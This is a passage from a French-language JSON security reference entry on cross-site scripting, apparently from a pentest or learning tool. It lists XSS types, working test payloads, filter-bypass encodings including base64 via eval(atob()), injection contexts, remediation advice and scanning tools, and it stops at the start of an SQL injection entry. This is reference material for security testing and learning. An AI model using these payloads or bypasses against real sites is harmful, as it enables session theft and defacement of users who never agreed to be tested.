    "xss": {
        "title": "Cross-Site Scripting (XSS)",
        "description": "Le XSS permet d'injecter des scripts malveillants dans les pages web visualisées par d'autres utilisateurs. Il peut permettre le vol de cookies, la capture de frappe, le défaussement de site, etc.",
        "types": {
            "reflected": "Le payload est réfléchi immédiatement dans la réponse (non persistant)",
            "stored": "Le payload est stocké sur le serveur et exécuté à chaque visite",
            "dom": "Le payload modifie le DOM côté client sans passer par le serveur",
            "blind": "Le payload s'exécute dans un contexte différent (admin panel, etc.)"
        },
        "payloads": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "'\"><script>alert('XSS')</script>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<iframe src='javascript:alert(\"XSS\")'>"
        ],
        "bypasses": [
            "<ScRiPt>alert('XSS')</ScRiPt> (case manipulation)",
            "%3Cscript%3Ealert('XSS')%3C/script%3E (URL encoding)",
            "&#60;script&#62;alert('XSS')&#60;/script&#62; (HTML entities)",
            "<svg/onload=alert`XSS`> (backticks)",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;> (decimal encoding)",
            "<img src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))> (base64)"
        ],
        "contexts": {
            "html": "Entre balises HTML",
            "attribute": "Dans un attribut HTML",
            "javascript": "Dans du code JavaScript",
            "url": "Dans une URL",
            "css": "Dans du CSS"
        },
        "remediation": "Échapper les sorties HTML, utiliser CSP (Content Security Policy), valider les entrées, utiliser HttpOnly sur les cookies.",
        "tools": [
            "XSStrike - Scan XSS intelligent",
            "Dalfox - Scan XSS rapide",
            "Burp Suite - Scanner XSS intégré",
            "XSS Hunter - Blind XSS detection"
        ]
    },
    
    "sql": {
        "title": "Injection SQL (SQLi)",
